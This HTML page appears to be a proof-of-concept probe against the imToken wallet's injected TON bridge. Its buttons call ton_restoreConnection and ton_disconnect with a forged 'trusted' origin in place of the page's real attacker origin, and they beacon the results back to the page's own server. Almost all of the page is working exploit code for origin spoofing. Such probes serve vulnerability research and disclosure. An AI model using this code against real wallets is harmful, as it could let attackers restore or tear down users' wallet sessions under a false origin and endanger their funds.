<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TON Session-Origin Binding Probe</title>
<style>
body{font:16px system-ui;margin:18px;background:#10151c;color:#edf4ff}
button{font:inherit;padding:12px 16px;margin:6px 0;display:block}
pre{white-space:pre-wrap;word-break:break-all;background:#1c2633;padding:12px;border-radius:8px}
</style>
<h2>TON session-origin binding probe</h2>
<p id="actual"></p>
<button id="honest">Restore using the actual attacker origin</button>
<button id="forged">Claim the trusted origin and restore</button>
<button id="disconnect">Claim the trusted origin and disconnect</button>
<pre id="state">Waiting for the injected bridge…</pre>
<script>
const RUN='TON_SESSION_B_20261005_01';
const TRUSTED='https://nan-zellic.github.io';
actual.textContent='Actual attacker document: '+location.href;
const show=x=>state.textContent=typeof x==='string'?x:JSON.stringify(x,null,2);
const call=(method,params)=>window.imToken.callPromisifyAPI('ton.request',{method,params});
const run=async(label,method,params)=>{
  try{
    show({run:RUN,label,actualOrigin:location.origin,claimedOrigin:params[1],status:'pending'});
    const result=await call(method,params);
    show({run:RUN,label,actualOrigin:location.origin,claimedOrigin:params[1],result});
    navigator.sendBeacon('/ton-result',JSON.stringify({run:RUN,label,actualOrigin:location.origin,claimedOrigin:params[1],result}));
  }catch(e){
    const out={run:RUN,label,actualOrigin:location.origin,claimedOrigin:params[1],error:e?.message||String(e)};
    show(out); navigator.sendBeacon('/ton-result',JSON.stringify(out));
  }
};
honest.onclick=()=>run('honest-restore','ton_restoreConnection',['inject',location.origin]);
forged.onclick=()=>run('forged-restore','ton_restoreConnection',['inject',TRUSTED]);
disconnect.onclick=()=>run('forged-disconnect','ton_disconnect',['inject',TRUSTED,{id:'tc-disconnect-'+RUN,method:'disconnect',params:[]}]);
</script>
